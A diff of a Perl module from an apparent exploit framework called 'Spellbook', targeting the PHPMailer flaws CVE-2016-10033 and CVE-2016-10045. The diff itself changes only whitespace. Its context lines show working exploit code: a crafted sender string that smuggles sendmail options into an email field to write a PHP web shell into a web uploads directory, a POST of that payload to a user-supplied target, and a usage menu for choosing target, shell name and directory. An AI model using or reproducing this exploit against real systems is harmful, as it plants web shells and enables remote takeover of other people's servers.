@@ -9,7 +9,7 @@ package Spellbook::Advisory::CVE_2016_10045 {
     sub new {
         my ($self, $parameters) = @_;
         my ($help, $target, @results);
-        
+
         my $dir   = '/var/www/html/uploads';
         my %shell = (
             'name' => 'spellbook_xpl.php',
@@ -23,9 +23,9 @@ package Spellbook::Advisory::CVE_2016_10045 {
             'S|shell=s'     => \$shell{name},
             'd|directory=s' => \$dir
         );
-        
+
         if ($target) {
-            if ($target !~ /^http(?:s)?:\/\//msx) { 
+            if ($target !~ /^http(?:s)?:\/\//msx) {
                 $target = "https://$target";
             }
 
@@ -36,10 +36,10 @@ package Spellbook::Advisory::CVE_2016_10045 {
 
                 $shell{code} = $code -> slurp();
             }
-            
+
             my $CVE_2016_10033 = "\"attacker\\\" -oQ/tmp/ -X$dir/$shell{name}  some\"\@email.com";
             my $CVE_2016_10045 = "\"attacker\\' -oQ/tmp/ -X$dir/$shell{name}  some\"\@email.com";
-            
+
             try {
                 my $request = $userAgent -> post($target, [
                     'action'  => "send",
@@ -69,7 +69,7 @@ package Spellbook::Advisory::CVE_2016_10045 {
                 \r=======================
                 \r-h, --help     See this menu
                 \r-t, --target   Define a target
-                \r-S, --shell    
+                \r-S, --shell
                 \r-d, --directory \n\n";
         }
 
